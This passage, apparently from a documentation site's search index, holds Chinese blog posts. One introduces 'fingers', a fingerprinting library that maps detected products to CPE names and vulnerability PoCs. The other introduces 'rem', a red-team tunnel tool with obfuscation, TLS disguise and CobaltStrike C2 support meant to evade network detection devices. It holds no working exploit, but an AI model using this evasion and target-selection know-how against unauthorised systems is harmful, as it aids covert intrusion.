\u8fd8\u6709\u66f4\u591a\u7684\u7ec6\u8282. </p> <p>\u4f8b\u5982:</p> <ul> <li> <p>\u6709\u4e9b\u6307\u7eb9\u5e93\u4e0d\u652f\u6301\u7248\u672c\u8bc6\u522b, \u4ed6\u4eec\u53ea\u8bc6\u522b\u4ea7\u54c1\u540d. </p> </li> <li> <p>\u6709\u4e9b\u6307\u7eb9\u5e93\u65e0\u6cd5\u8bc6\u522b\u670d\u52a1\u6307\u7eb9, \u53ea\u80fd\u8bc6\u522bweb\u6307\u7eb9. </p> </li> <li> <p>\u6709\u4e9b\u6307\u7eb9\u5e93\u65e0\u6cd5\u8bc6\u522b\u9700\u8981\u4e3b\u52a8\u53d1\u5305\u7684\u6307\u7eb9</p> </li> <li>\u6709\u4e9b\u6307\u7eb9\u5e93\u91c7\u7528\u4e86dsl\u8fdb\u884c\u89c4\u5219\u7f16\u5199, \u65e0\u6cd5\u76f4\u63a5\u8f6c\u4e3a\u540c\u4e00\u683c\u5f0f</li> <li>\u6709\u4e9b\u6307\u7eb9\u5e93\u652f\u6301\u7684favicon\u662fmd5, \u6709\u4e9b\u662fmmh3</li> <li>......</li> </ul> <p>\u8fd9\u4e9b\u95ee\u9898\u51b3\u5b9a\u4e86\u4e0d\u540c\u7684\u6307\u7eb9\u5e93\u76f4\u63a5\u662f\u65e0\u6cd5\u65e0\u635f\u8f6c\u6362\u7684, \u6570\u636e\u683c\u5f0f\u8f6c\u8fc7\u53bb\u4e86, \u4e0d\u4ee3\u8868\u80fd\u529b\u8f6c\u8fc7\u53bb\u4e86.</p>"},{"location":"blog/2024/07/24/fingers-introduce/#\u4ece\u6307\u7eb9\u8bc6\u522b\u8f6c\u5316\u4e3a\u6f0f\u6d1e","title":"\u4ece\u6307\u7eb9\u8bc6\u522b\u8f6c\u5316\u4e3a\u6f0f\u6d1e","text":"<p>\u800c\u8fd9\u4e5f\u53ea\u662f\u6307\u7eb9\u8bc6\u522b\u8fd9\u4e2a\u573a\u666f\u4e2d\u7684\u4e00\u4e2a\u5c0f\u9ebb\u70e6.\u66f4\u5927\u7684\u9ebb\u70e6\u5728\u4e8e\u5982\u4f55\u4ece\u6307\u7eb9\u53d8\u6210\u6f0f\u6d1e,\u6216\u8005\u8bf4\u662f\u653b\u51fb\u9762.</p> <p>\u65e9\u671f\u5f88\u591a\u5de5\u5177\u4f1a\u5c06\u5185\u7f6e\u7684poc\u4e0eexp\u4e00\u80a1\u8111\u7684\u6253\u51fa\u53bb. \u4ed6\u4eec\u53ea\u9700\u8981\u8003\u8651\u8bef\u62a5\u4e0e\u6f0f\u62a5, \u4e0d\u9700\u8981\u8003\u8651opsec, \u4e5f\u4e0d\u9700\u8981\u8003\u8651\u5176\u4ed6\u98ce\u9669. \u8fd9\u786e\u5b9e\u662f\u4e2a\u5f88\u6709\u6548\u7684\u89e3\u51b3\u529e\u6cd5.  \u4f46\u5230\u4e862024\u5e74, \u57fa\u7840\u7684\u5b89\u5168\u8bbe\u5907\u5df2\u7ecf\u666e\u53ca\u4e86. \u628a\u5168\u90e8poc\u6253\u51fa\u53bb\u4e0d\u4f1a\u6536\u83b7\u6f0f\u6d1e, \u53ea\u4f1a\u4e00\u65e0\u6240\u6709.</p> <p>\u6307\u7eb9\u5e93\u9879\u76ee\u7684\u51fa\u73b0\u5b9e\u9645\u4e0a\u4e5f\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u7c7b\u573a\u666f\u7684, \u65f6\u95f4\u70b9\u4e0a\u51e0\u4e4e\u4e0e\u57fa\u7840\u5b89\u5168\u8bbe\u5907\u7684\u666e\u53ca\u7b26\u5408. </p> <p>\u73b0\u5728\u9ad8\u6548\u7387\u7684\u6f0f\u6d1e\u63a2\u6d4b, \u9700\u8981\u5148\u8bc6\u522b\u6307\u7eb9, \u518d\u4ecepoc\u5e93\u4e2d\u6311\u9009\u5408\u9002\u7684poc\u6d4b\u8bd5, \u8fd9\u6837\u624d\u80fd\u6700\u9ad8\u6548\u7387\u6700\u9ad8\u51c6\u786e\u5ea6\u7684\u6536\u83b7\u6f0f\u6d1e, \u6700\u4e0d\u6d4e\u4e5f\u80fd\u6536\u83b7\u4e00\u4e2a\u6f5c\u5728\u7684\u653b\u51fb\u9762. </p> <p>\u4ece\u6307\u7eb9\u8f6c\u5230poc, \u6700\u76f4\u63a5\u7684\u7406\u89e3\u8bc6\u522b\u5230\u6307\u7eb9\u4ee5\u53ca\u7248\u672c, \u7136\u540e\u6839\u636e\u7248\u672c\u53f7\u6311poc.</p> <p>\u4f46\u771f\u6709\u8fd9\u4e48\u7b80\u5355\u4e48? \u9996\u5148\u7684\u95ee\u9898\u5c31\u662f, \u5927\u91cf\u4f9b\u5e94\u94fe\u4ea7\u54c1, \u4ed6\u4eec\u7684\u6f0f\u6d1e\u5e76\u65e0\u7edf\u4e00\u7684\u6f0f\u6d1e\u7f16\u53f7. \u5c31\u7b97\u6709\u7edf\u4e00\u7684\u6f0f\u6d1e\u7f16\u53f7, \u5728CVE\u6216CNVD\u7684title\u4e0a\u4e5f\u6709\u597d\u51e0\u4e2a\u4e0d\u540c\u7684\u8868\u793a, \u5176\u6b21\u6307\u7eb9\u5e93\u4e4b\u95f4\u540c\u4e00\u4e2a\u4ea7\u54c1\u7684\u540d\u5b57\u4e5f\u4e0d\u76f8\u540c. \u65e0\u6cd5\u4e4b\u95f4\u901a\u8fc7\u6307\u7eb9\u540d\u5b57\u5b9a\u4f4d\u5230\u901a\u7528\u7684\u6f0f\u6d1e\u5e93\u4e0a. \u7279\u522b\u662f\u5728\u82f1\u8bed\u4e16\u754c, \u8fd9\u4e2a\u5dee\u5f02\u8fd8\u5c0f\u4e00\u4e9b, \u975e\u82f1\u8bed\u4e16\u754c\u7684\u6307\u7eb9\u540d\u5b57\u4e94\u82b1\u516b\u95e8. </p> <p>\u8fd9\u4e2a\u95ee\u9898\u7684\u89e3\u8fd8\u662f\u5728nmap\u4e0a, \u4e0e\u4e94\u82b1\u516b\u95e8\u7684\u6307\u7eb9\u5e93\u4e0d\u540c\u7684\u662f, nmap\u63d0\u4f9b\u4e86\u4e00\u4e2a\u76f8\u5bf9\u6807\u51c6\u5316\u7684\u6307\u7eb9\u8bc6\u522b\u7684\u89e3\u51b3\u65b9\u6848---CPE (Common Platform Enumeration).  nmap\u7ed9\u80fd\u8bc6\u522b\u5230\u7684\u6bcf\u4e2a\u6307\u7eb9\u90fd\u6dfb\u52a0\u4e86CPE, \u800cCVE\u6307\u7eb9\u5e93\u4e5f\u63d0\u4f9b\u4e86\u6bcf\u4e2a\u4ea7\u54c1\u7684CPE\u540d. \u5c31\u7b97title\u4e0d\u540c, \u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u5176\u901a\u8fc7\u6807\u51c6\u5316\u547d\u540d\u8fdb\u884c\u68b3\u7406. </p> <p>\u7b80\u5355\u4ecb\u7ecdCPE</p> <pre><code>* part: \u8868\u793a CPE \u9879\u76ee\u7684\u7c7b\u522b\u3002\u503c\u5305\u62ec\u5e94\u7528\u7a0b\u5e8f (a)\u3001\u64cd\u4f5c\u7cfb\u7edf (o) \u548c\u786c\u4ef6 (h)\u3002\n* vendor: \u4ea7\u54c1\u7684\u4f9b\u5e94\u5546\u6216\u5236\u9020\u5546\u3002\u4f8b\u5982\uff1a`microsoft`, `apple`, `google`\u3002\n* product: \u4ea7\u54c1\u7684\u540d\u79f0\u3002\u4f8b\u5982\uff1a`windows_10`, `macos`, `chrome`\u3002\n* version: \u4ea7\u54c1\u7684\u7248\u672c\u53f7\u3002\u4f8b\u5982\uff1a`10`, `11.0`, `88.0.4324`\u3002\n* update: \u4ea7\u54c1\u7684\u66f4\u65b0\u6216\u4fee\u8ba2\u7248\u672c\u3002\u4f8b\u5982\uff1a`sp1`\uff08Service Pack 1\uff09\u3002\n* edition: \u4ea7\u54c1\u7684\u53d1\u884c\u7c7b\u578b\u3002\u4f8b\u5982\uff1a`enterprise`, `home`, `professional`\u3002\n* language: \u4ea7\u54c1\u7684\u8bed\u8a00\u7248\u672c\u3002\u4f8b\u5982\uff1a`en`\uff08English\uff09, `fr`\uff08French\uff09, `de`\uff08German`\uff09\u3002\n* sw_edition: \u7279\u5b9a\u7684\u8f6f\u4ef6\u7248\u672c\u3002\u4f8b\u5982\uff1a`demo`, `beta`\u3002\n* target_software: \u4ea7\u54c1\u6240\u8fd0\u884c\u7684\u76ee\u6807\u8f6f\u4ef6\u5e73\u53f0\u3002\u4f8b\u5982\uff1a`android`, `ios`\u3002\n* target_hardware: \u4ea7\u54c1\u6240\u8fd0\u884c\u7684\u76ee\u6807\u786c\u4ef6\u5e73\u53f0\u3002\u4f8b\u5982\uff1a`x86`, `arm`\u3002\n* other: \u5176\u4ed6\u53ef\u80fd\u7684\u5206\u7c7b\u6216\u6807\u8bc6\u4fe1\u606f\u3002\n</code></pre> <p>Formatted String\uff1a\u6807\u51c6\u683c\u5f0f<code>cpe:2.3:a:microsoft:windows_10:1909:*:*:*:*:*:*:*</code></p> <p>WFN\uff1a\u7528\u4e8e\u9700\u8981\u8be6\u7ec6\u63cf\u8ff0\u548c\u7cbe\u786e\u5339\u914d\u7684\u5e73\u53f0\u573a\u666f\uff0c\u9002\u5408\u5185\u90e8\u4f7f\u7528\u548c\u5b58\u50a8\u3002<code>wfn:[part=\"a\", vendor=\"microsoft\", product=\"windows_10\", version=\"1909\"]</code></p> <p>URI\uff1a\u9002\u7528\u4e8e Web \u5e94\u7528\u548c\u8d44\u6e90\u6807\u8bc6\uff0c\u4fbf\u4e8e\u5d4c\u5165\u548c\u4f20\u8f93\u3002<code>cpe:/a:microsoft:windows_10:1909</code></p> <p>\u5927\u591a\u6570\u6f0f\u6d1e\u5e93\u4f7f\u7528Formatted String\u8868\u793aCPE.</p> <p>\u4f46\u8fd9\u4e5f\u8fd8\u662f\u89e3\u51b3\u4e86\u82f1\u8bed\u4e16\u754c\u7684\u4ea7\u54c1\u547d\u540d, \u975e\u82f1\u8bed\u4e16\u754c\u8fd8\u662f\u6ca1\u6709\u4e00\u4e2a\u7edf\u4e00\u7684CPE\u547d\u540d\u89c4\u8303, \u5982\u679c\u4ea7\u54c1\u7684\u5382\u5546\u4e0d\u4e3b\u52a8\u5bf9\u63a5\u6f0f\u6d1e\u5e73\u53f0, \u4e00\u4e2a\u4ea7\u54c1\u51fa\u73b0\u591a\u4e2aCPE\u540d\u5b57\u4e5f\u662f\u5bb6\u5e38\u4fbf\u996d. \u4f46\u597d\u5728\u901a\u8fc7CPE\u7684\u641c\u7d22\u53ef\u4ee5\u6307\u901a\u8fc7product\u6216\u8005\u53ea\u901a\u8fc7vendor\u8fdb\u884c, \u5e76\u4e0d\u9700\u8981\u5b8c\u5168\u5339\u914d\u4e00\u81f4\uff0c \u53ef\u4ee5\u505a\u4e00\u5199\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u901a\u7528\u7684\u8f6c\u6362, \u4f8b\u5982\u7edf\u4e00\u8f6c\u5c0f\u5199, <code>-</code>\u8f6c<code>_</code>, \u5ffd\u7565\u7a7a\u683c\u7b49\u5b57\u7b26\u4e32\u5904\u7406, \u5c3d\u91cf\u89e3\u51b3\u6307\u7eb9\u7684\u522b\u540d\u95ee\u9898. </p>"},{"location":"blog/2024/07/24/fingers-introduce/#\u6307\u7eb9\u8bc6\u522b\u7684\u7ec8\u6781\u89e3\u51b3\u65b9\u6848","title":"\u6307\u7eb9\u8bc6\u522b\u7684\u7ec8\u6781\u89e3\u51b3\u65b9\u6848","text":"<p>\u9762\u5bf9\u4e0a\u9762\u8fd9\u4e9b\u95ee\u9898, \u6700\u76f4\u89c2\u7684\u89e3\u51b3\u65b9\u6848\u627e\u8fd0\u8425\u6765\u5199\u89c4\u5219. \u4f46\u5f00\u6e90\u4e16\u754c\u6709\u5f00\u6e90\u4e16\u754c\u7684\u73a9\u6cd5. </p> <p>\u5728\u6df1\u5165\u8c03\u7814\u4e86\u6307\u7eb9\u5f15\u64ce\u7684\u5f00\u6e90\u4e16\u754c\u5b9e\u73b0, \u4ee5\u53ca\u591a\u5e74\u4e00\u76f4\u5728\u7ef4\u62a4\u7684fingers\u6307\u7eb9\u5e93, \u60f3\u5230\u4e86\u4e00\u4e2a\u7edd\u5999\u7684\u70b9\u5b50.</p> <p>\u4e0d\u505a\u89c4\u5219\u5e93\u79fb\u690d\u4e86, \u76f4\u63a5\u5b9e\u73b0\u89c4\u5219\u5e93\u672c\u4f53, \u7136\u540e\u8f6c\u6362\u4e3a\u540c\u4e00\u683c\u5f0f\u4e0d\u5c31\u597d\u4e86. </p> <p>\u6211\u89c9\u5f97\u6211\u627e\u5230\u4e86\u6307\u7eb9\u8bc6\u522b\u7684\u7ec8\u6781\u89e3\u51b3\u65b9\u6848, \u5e76\u5b9e\u73b0\u4e86\u5b83!</p> <p>https://github.com/chainreactors/fingers</p>"},{"location":"blog/2024/07/24/fingers-introduce/#\u591a\u6307\u7eb9\u5f15\u64ce","title":"\u591a\u6307\u7eb9\u5f15\u64ce","text":"<p>\u76ee\u524d\u5f00\u6e90\u4e16\u754c\u7684\u6307\u7eb9\u5e93\u7684\u89c4\u5219\u90fd\u8fd8\u4e0d\u662f\u5f88\u590d\u6742, \u53ea\u9700\u8981\u5c11\u5219\u51e0\u5341\u884c\u591a\u5219\u51e0\u767e\u884c\u4ee3\u7801\u5c31\u80fd100%\u5b9e\u73b0\u539f\u6709\u6307\u7eb9\u5e93\u7684\u5f15\u64ce. </p> <p>\u6307\u7eb9\u5e93\u89c4\u5219\u8f6c\u6362\u662f\u6709\u635f\u7684, \u4f46\u662f\u76f4\u63a5\u5b9e\u73b0\u6307\u7eb9\u5f15\u64ce, \u4e0d\u4ec5\u5728\u80fd\u529b\u4e0a\u65e0\u635f, \u8fd8\u662f\u987a\u624b\u7ed9\u5b83\u505a\u4e00\u4e9b\u6027\u80fd\u4f18\u5316. </p> <p>\u5f53\u524d\u652f\u6301\u7684\u7b2c\u4e09\u65b9\u6307\u7eb9\u5f15\u64ce\u5df2\u7ecf\u6709:</p> <ul> <li>ehole</li> <li>fingerprinthub</li> <li>wappalyzer</li> <li>goby</li> </ul> <p>\u5f53\u7136\u4e0d\u6b62\u4e8e\u6b64, \u4e00\u4e9b\u6682\u65f6\u672a\u88ab\u516c\u5f00\u5546\u4e1a\u5de5\u5177\u7684\u6307\u7eb9\u5e93. \u56e0\u4e3a\u53ef\u80fd\u6d89\u53ca\u5230\u7684\u98ce\u9669, \u672a\u516c\u5f00\u5546\u4e1a\u5de5\u5177\u7684\u76f8\u5173\u5b9e\u73b0\u4e0d\u4f1a\u5f00\u6e90, \u76ee\u524d\u4ee5\u5185\u90e8\u7684<code>morefingers</code>\u4ed3\u5e93, \u901a\u8fc7\u52a8\u6001\u6ce8\u518c\u5f15\u64ce\u5230fingers\u4e2d, \u6709\u6388\u6743\u7684\u7528\u6237\u73b0\u5728\u5df2\u53ef\u4ee5\u4f7f\u7528.</p>"},{"location":"blog/2024/07/24/fingers-introduce/#\u7edf\u4e00\u8f93\u51fa\u683c\u5f0f","title":"\u7edf\u4e00\u8f93\u51fa\u683c\u5f0f","text":"<p>\u5b9e\u73b0\u4e86\u6307\u7eb9\u5f15\u64ce, \u53ea\u9700\u8981\u590d\u7528fingers\u539f\u672c\u6307\u7eb9\u8f93\u51fa\u7ed3\u6784, \u5e76\u5bf9\u6307\u7eb9\u6765\u6e90\u505a\u4e00\u5b9a\u7684\u6807\u8bb0.  </p> <p>\u5f53\u7136\u6ca1\u8fd9\u4e48\u7b80\u5355, \u8fd9\u91cc\u5c31\u9047\u5230\u4e86\u95ee\u9898, \u4e0d\u540c\u6307\u7eb9\u5e93\u5bf9\u540c\u4e00\u4e2a\u6307\u7eb9\u4e0d\u4e00\u5b9a\u662f\u76f8\u540c\u540d\u5b57, \u5728fingers\u4e2d\u53eb\u505a<code>\u7528\u53cbnc</code>, \u5728\u5176\u4ed6\u6307\u7eb9\u5e93\u4e2d\u5c31\u53eb\u505a<code>yonyou nc</code>. </p> <p>\u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898, \u9996\u5148\u8981\u5b9e\u73b0\u521a\u521a\u63d0\u5230\u7684\u5b57\u7b26\u4e32\u6a21\u7cca\u5339\u914d\u7684\u5904\u7406\u64cd\u4f5c</p> <ul> <li>\u4e2d\u6587\u8f6c\u62fc\u97f3</li> <li>\u5927\u5199\u8f6c\u5c0f\u5199</li> <li>\u5ffd\u7565<code>_</code>, <code>-</code>, <code>[blank]</code></li> </ul> <p>\u4f46\u8fd9\u4e5f\u53ea\u80fd\u89e3\u51b3\u4e00\u90e8\u5206\u95ee\u9898, \u5269\u4e0b\u5c31\u9700\u8981\u624b\u52a8\u914d\u7f6e\u4e0d\u540c\u6307\u7eb9\u5e93\u4e2d\u7684\u522b\u540d\u4e86. </p> <p>\u4e3a\u6b64, fingers\u4e2d\u63d0\u4f9b\u4e86<code>aliases.yaml</code> ,\u7528\u6765\u7edf\u4e00\u4e0d\u540c\u6307\u7eb9\u5e93\u4e2d\u7684\u5404\u79cd\u522b\u540d. \u597d\u5728\u73b0\u5728\u6709GPT4, \u80fd\u4e0a\u4f20\u6307\u7eb9\u5e93\u7684json\u6587\u4ef6, \u5b9e\u73b0\u6bd4\u8f83\u57fa\u7840\u7684\u6307\u7eb9\u522b\u540d\u8f6c\u6362, \u5e76\u8865\u5145product\u4e0evendor\u5b57\u6bb5. </p> <p></p>"},{"location":"blog/2024/07/24/fingers-introduce/#sdk","title":"SDK","text":"<p>fingers \u5c06\u4ee5\u4e00\u4e2a\u5e93\u7684\u65b9\u5f0f\u53d1\u5e03, \u51e0\u884c\u4ee3\u7801\u5c31\u80fd\u8d4b\u4e88\u4f60\u7684\u5de5\u5177\u76ee\u524d\u6700\u5f3a\u5927\u7684\u6307\u7eb9\u8bc6\u522b\u80fd\u529b.  \u53ea\u9700\u8981\u51e0\u884c\u4ee3\u7801\uff0c \u5c06\u80fd\u8d4b\u4e88\u5de5\u5177\u6307\u7eb9\u8bc6\u522b\u80fd\u529b. <pre><code>func TestNewEngine(t *testing.T) {\n    engine, err := NewEngine()\n    if err != nil {\n        panic(err)\n    }\n    resp, err := http.Get(\"https://baidu.com\")\n    if err != nil {\n        return\n    }\n    frames, err := engine.DetectResponse(resp)\n    if err != nil {\n        return\n    }\n    fmt.Println(frames)\n}\n</code></pre></p> <p>spray v1.0.0   (\u5df2\u53d1\u5e03prerelease)\u662f\u7b2c\u4e00\u4e2a\u5b8c\u5168\u9002\u914dfingers\u5e93\u80fd\u529b\u7684\u5de5\u5177.   \u53ef\u4ee5\u5728spray\u4e2d\u4f53\u9a8c\u672c\u6587\u4e2d\u7684\u5404\u79cd\u7279\u6027.</p> <p></p> <p>SDK \u8be6\u7ec6\u6587\u6863\u8bf7\u89c1 https://chainreactors.github.io/wiki/libs/fingers</p>"},{"location":"blog/2024/07/24/fingers-introduce/#todo","title":"TODO","text":""},{"location":"blog/2024/07/24/fingers-introduce/#\u652f\u6301\u66f4\u591a\u5f15\u64ce","title":"\u652f\u6301\u66f4\u591a\u5f15\u64ce","text":"<p>\u6700\u7ec8\u76ee\u6807\u662f\u5b9e\u73b0\u6307\u7eb9\u8bc6\u522b\u7684**allinone**</p> <ul> <li>fingerprinthubv4</li> <li>nmap</li> <li>kscan</li> <li>tidefinger (\u6574\u5408\u4e86whatapp)</li> </ul>"},{"location":"blog/2024/07/24/fingers-introduce/#\u5bf9\u63a5\u6f0f\u6d1e\u5e93","title":"\u5bf9\u63a5\u6f0f\u6d1e\u5e93","text":"<p>\u5bf9\u63a5\u6f0f\u6d1e\u5e93\u5c06\u6682\u65f6\u901a\u8fc7cvemap\u6765\u5b9e\u73b0. \u56e0\u4e3anuclei\u662f\u76ee\u524d\u6700\u4e30\u5bcc\u7684poc\u4ed3\u5e93, cvemap\u5df2\u7ecf\u5b9e\u73b0\u4e86\u4eceproduct\u6216\u8005cveid\u5230poc templates\u7684\u5bf9\u63a5. \u6211\u4eec\u53ea\u9700\u8981\u8f93\u51faproduct\u7684\u540d\u5b57\u6216\u8005cpe, \u5c31\u80fd\u4f7f\u7528cvemap\u4ecenuclei-templates\u4e2d\u5bfb\u627e\u5408\u9002\u7684template. </p> <p>\u540e\u7eed\u5c06\u4f1a\u63d0\u4f9b\u76f8\u5173\u7684API.</p>"},{"location":"blog/2024/07/24/fingers-introduce/#\u540e\u8bdd","title":"\u540e\u8bdd","text":"<p>fingers \u5df2\u7ecf\u4ece\u4e00\u4e2agogo\u7684\u5355\u6587\u4ef6\u53d1\u5c55\u56ca\u62ec\u591a\u4e2a\u6307\u7eb9\u5e93/\u6307\u7eb9\u5f15\u64ce, \u6709\u5404\u79cd\u7528\u6cd5\u7684\u72ec\u7acb\u4ed3\u5e93.  \u4f5c\u4e3a\u5728\u63a5\u4e0b\u6765\u7684\u653b\u9632\u5bf9\u6297\u4e2d\u7684\u4e00\u4efd\u793c\u7269, \u4ece\u5f00\u6e90\u4e16\u754c\u4e2d\u6765, \u8fd8\u7ed9\u5f00\u6e90\u4e16\u754c. </p>"},{"location":"blog/2025/04/13/rem-introduce/","title":"\u653b\u9632\u573a\u666f\u4e2d\u7684\u7f51\u7edc\u4fa7\u5bf9\u6297\u9769\u547d (\u4e0a)   rem","text":""},{"location":"blog/2025/04/13/rem-introduce/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>\u6709\u4e00\u4e2a\u7b11\u8bdd\uff0c\"\u4e2d\u56fd\u4eba\u7684\u7f51\u7edc\u6c34\u5e73\u7279\u522b\u597d\". \u4e8b\u5b9e\u4e0a\u4e5f\u786e\u5b9e\u5982\u6b64, \u7edd\u5927\u90e8\u5206\u4ee3\u7406\u76f8\u5173\u7684\u5de5\u5177\u90fd\u548c\u4e2d\u56fd\u5f00\u53d1\u8005\u6709\u5173.</p> <p>\u6211\u4eec\u5df2\u7ecf\u6709\u4e86\u5f88\u591a\u597d\u7528\u7684\u4ee3\u7406\u5de5\u5177\uff0c\u5982\u4e0b\u9762\u63d0\u5230\u7684\u8fd9\u90e8\u5206:</p> <ul> <li>frp \u6700\u5e38\u4f7f\u7528, \u6700\u7a33\u5b9a\u7684\u53cd\u5411\u4ee3\u7406\u5de5\u5177. \u914d\u7f6e\u76f8\u5bf9\u9ebb\u70e6, \u6709\u4e00\u4e9b\u5f3a\u7279\u5f81\u5df2\u88ab\u4e3b\u6d41\u9632\u62a4\u8bbe\u5907\u8bc6\u522b, \u7c7b\u4f3c\u7684\u8fd8\u6709nps, ngrok, rathole, spp. \u4e0d\u652f\u6301\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1</li> <li>gost \u4e00\u6b3e\u5f3a\u5927\u7684\u6b63\u5411\u4ee3\u7406\u5de5\u5177, v2\u7248\u672c\u4e0d\u652f\u6301\u53cd\u5411\u4ee3\u7406, v3\u5f00\u59cb\u652f\u6301\u66f4\u591a\u79cd\u591a\u6837\u7684\u6d41\u91cf\u64cd\u4f5c\u65b9\u5f0f, \u672a\u6765\u53ef\u671f.</li> <li>iox \u8f7b\u91cf\u4f46\u7a33\u5b9a\u7684\u7aef\u53e3\u8f6c\u53d1\u5de5\u5177, \u4f46\u662f\u901a\u8baf\u4e0d\u52a0\u5bc6</li> <li>stowaway \u591a\u7ea7\u4ee3\u7406\u5de5\u5177, \u652f\u6301\u6b63\u53cd\u5411\u4ee3\u7406\uff0c \u4f46\u662f\u8fdb\u652f\u6301TCP/HTTP/WS\u534f\u8bae\u901a\u8baf. \u7c7b\u4f3c\u7684\u5de5\u5177\u8fd8\u6709lcx,termite,earthworm.</li> </ul> <p>\u4ece\u4f7f\u7528\u573a\u666f\u8986\u76d6\u6765\u8bf4\uff0c \u8fd9\u4e9b\u5de5\u5177\u52a0\u8d77\u6765\u786e\u5b9e\u8986\u76d6\u4e86\u5173\u4e8e proxy/tunnel \u768490%\u4ee5\u4e0a\u573a\u666f, \u4f46\u5982frp\uff0cgost, iox \u8fd9\u4e9b\u5de5\u5177\u8bbe\u8ba1\u4e0a\u5e76\u4e0d\u662f\u7ed9\u653b\u9632\u573a\u666f\u4f7f\u7528\u7684, \u73b0\u5728\u7684NDR\u8bbe\u5907\u53ef\u4ee5\u8f7b\u677e\u6355\u83b7\u4ed6\u4eec\u7684\u7279\u5f81. \u5e76\u4e14\u5f80\u5f80\u662f\u5355\u4e2a\u5de5\u5177\u53ea\u89e3\u51b3\u4e86\u90e8\u5206\u573a\u666f\u7684\u9700\u6c42\uff0c \u4e0d\u80fd\u8986\u76d6\u6240\u6709\u573a\u666f\u3002</p> <p>\u4ee3\u7801\u4ed3\u5e93: https://github.com/chainreactors/rem-community</p> <p>\u4f7f\u7528\u6587\u6863: https://chainreactors.github.io/wiki/rem/usage/</p>"},{"location":"blog/2025/04/13/rem-introduce/#features","title":"Features","text":""},{"location":"blog/2025/04/13/rem-introduce/#\u57fa\u672c\u529f\u80fd","title":"\u57fa\u672c\u529f\u80fd","text":"<ul> <li>\u6b63\u5411\u7aef\u53e3\u8f6c\u53d1, \u5c06\u7aef\u53e3\u4ece\u672c\u673a\u8f6c\u53d1\u5230\u8fdc\u7a0b</li> <li>\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1,  \u5c06\u7aef\u53e3\u4ece\u8fdc\u7a0b\u8f6c\u53d1\u5230\u672c\u673a</li> <li>\u6b63\u5411\u4ee3\u7406, \u642d\u5efasocks5/http\u4ee3\u7406</li> <li>\u53cd\u5411\u4ee3\u7406, \u901a\u8fc7\u670d\u52a1\u5668, \u5c06\u6d41\u91cf\u4ee3\u7406\u81f3\u5ba2\u6237\u7aef. (rem\u4e2d\u5b9e\u9645\u4e0a\u5e76\u4e0d\u4e00\u5b9a\u6709\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u4e4b\u5206, rem\u4e2d\u53ef\u4ee5\u5c06\u6d41\u91cf\u4ee3\u7406\u81f3\u4efb\u610f\u8282\u70b9)</li> <li>\u652f\u6301TCP, UDP, ICMP, HTTP, WebSocket, Wireguard, Unix, SMB, Memory \u4f20\u8f93\u5c42</li> <li>\u652f\u6301socks5/socks4, https/http, trojan, shadowsocks, neoreg, suo5 \u8df3\u8f6c\u4ee3\u7406</li> <li>\u652f\u6301socks5/socks4, https/http, trojan, shadowsocks, CobaltStrike external C2 \u5e94\u7528\u5c42\u534f\u8bae</li> <li>\u7ea7\u8054, \u80fd\u901a\u8fc7rem\u81ea\u8eab\u7684\u534f\u8bae, \u5f62\u6210\u591a\u7ea7\u7684\u8282\u70b9\u7684\u8fde\u63a5\u5173\u7cfb</li> <li>\u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1,  \u5c06\u7aef\u53e3\u4ece\u672c\u673a\u901a\u8fc7rem\u8f6c\u53d1\u5230\u4efb\u610frem\u7f51\u7edc\u4e2d\u7684\u8282\u70b9</li> <li>\u591a\u7ea7\u4ee3\u7406\u8f6c\u53d1, \u5c06\u6d41\u91cf\u901a\u8fc7rem\u8f6c\u53d1\u5230\u4efb\u610frem\u7f51\u7edc\u4e2d\u7684\u8282\u70b9</li> <li>RPORTFWD_LOCAL, (\u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1\u7684\u7279\u4f8b), \u5c06\u672c\u673a\u7684\u7684\u7aef\u53e3\u901a\u8fc7rem\u8f6c\u53d1\u81f3</li> <li>PORTFWD_LOCAL,  (\u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1\u7684\u7279\u4f8b), \u5c06rem\u8282\u70b9\u7684\u7aef\u53e3\u8f6c\u53d1\u81f3\u672c\u673a</li> <li>... </li> </ul> <p>\u7406\u8bba\u4e0a\u53ea\u9700\u8981\u5c06\u4e0a\u8ff0\u529f\u80fd\u4ea4\u53c9\u7ec4\u5408\u5c31\u80fd\u5b9e\u73b0\u4e00\u5207 proxy/tunnel\u76f8\u5173\u7684\u9700\u6c42. </p>"},{"location":"blog/2025/04/13/rem-introduce/#opsec\u7279\u6027","title":"OPSEC\u7279\u6027","text":"<ul> <li>\u52a0\u5bc6\u6df7\u6dc6\u5c42\u4e92\u76f8\u5d4c\u5957\u4efb\u610f\u7ec4\u5408\uff0c \u5e76\u968f\u673a\u751f\u6210\u521d\u59cb\u6a21\u677f</li> <li>\u652f\u6301\u591a\u4fe1\u9053</li> <li>\u652f\u6301 https://lolc2.github.io/ , \u80fd\u5c06\u4efb\u610f\u6570\u636e\u4ea4\u6362\u7684\u4fe1\u9053\u4f5c\u4e3a\u4ee3\u7406\u96a7\u9053</li> <li>\u6309\u9700\u6761\u4ef6\u7f16\u8bd1, \u5c3d\u53ef\u80fd\u964d\u4f4e\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u4f53\u79ef\u548c\u7279\u5f81</li> <li>\u652f\u6301\u8de8\u8bed\u8a00\u4ea4\u4e92\u6027, \u80fd\u901a\u8fc7\u52a8\u6001/\u9759\u6001\u94fe\u63a5\u5e93\u53ef\u4ee5\u5b9e\u73b0\u5728\u4e0d\u540c\u7684\u8bed\u8a00\u4e2d\u8c03\u7528rem</li> <li>tls, tlsintls, shadowtls, utls, reality \u7b49\u5404\u79cd\u57fa\u4e8etls\u5b9e\u73b0\u7684\u4f2a\u88c5\u52a0\u5bc6\u6280\u672f</li> <li>\u4e0a\u4e0b\u884c\u6d41\u91cf\u7279\u5f81\u72ec\u7acb\u5b9a\u5236</li> <li>......</li> </ul> <p>\u672c\u8d28\u4e0arem\u53ea\u662f\u4e00\u4e2atunnel/proxy \u5f00\u53d1\u6846\u67b6, 